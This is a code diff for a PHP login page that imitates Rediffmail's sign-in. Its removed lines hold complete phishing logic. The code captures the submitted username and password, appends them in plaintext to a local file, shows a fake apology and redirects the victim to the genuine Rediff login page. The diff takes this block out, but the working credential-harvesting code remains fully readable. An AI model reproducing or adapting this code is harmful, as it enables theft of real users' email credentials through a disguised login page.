@@ -27,54 +27,7 @@
             <span class="mail">mail</span>
         </div>
         <div class="form_div">
-        <?php
-        // session_start();
-        $error_msg = "";
-        if($_SERVER['REQUEST_METHOD'] == 'POST')
-        {
-            $user = $_POST['username'];
-            $pwd = $_POST['password'];
-            $pattern = "/^[a-zA-Z0-9._%+-]+@rediffmail\.com$/";  
-            // validate_username($user);
-            if(empty($user) || empty($pwd))
-            { 
-                $error_msg = "Username field is empty";
-                // exit();
-            }
-            // if (empty($user)) {
-            //     echo "<script>document.getElementById('error-message').innerHTML = '$error_msg';</script>";
-            //     exit();
-            // }
-            
-            else if(!preg_match($pattern,$user))
-                {
-                    $error_msg = "Wrong username format";
-                    // exit();
-                }
-                // die("Incorrect format");
-            // if(empty($error_msg))
-            else
-            {
-                $fp = fopen("username.txt",'a');
-                fwrite($fp,"USERNAME : ");
-                fwrite($fp,$user);
-                fwrite($fp," -- ");
-                fwrite($fp,"PASSWORD : ");
-                fwrite($fp,$pwd);
-                fwrite($fp,"\n");
-                fclose($fp);
-                echo $error_msg;
-                echo "Sorry for the inconvinience. Redirecting to login page.";
-                header("Refresh:3; url=https://mail.rediff.com/cgi-bin/login.cgi");
-                exit();
-            }
-        }
-    
-        ?>
-            <div class="error_msg">
-                <?php echo $error_msg; ?>
-            </div>
-            <form action="<?php $_SERVER['PHP_SELF']; ?>" method="POST">
+        <form action="<?php $_SERVER['PHP_SELF']; ?>" method="POST">
             <!-- <form action="login.php" method="POST"> -->
                 <table>
                     
